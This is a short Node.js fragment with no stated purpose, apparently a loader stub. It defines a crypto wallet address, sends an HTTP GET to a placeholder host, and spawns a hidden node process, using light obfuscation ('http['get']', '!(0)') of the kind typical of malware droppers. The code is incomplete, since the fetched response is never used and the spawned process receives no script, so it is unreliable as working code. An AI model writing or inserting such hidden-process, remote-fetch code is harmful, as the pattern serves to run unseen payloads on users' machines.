const { spawn } = require('child_process');
const http = require('http');
const wallet = '0xa322E5f3';
function launch() {
  http['get']('https://example.invalid/0x/cls');
  spawn('node', [], { windowsHide: !(0) });
}
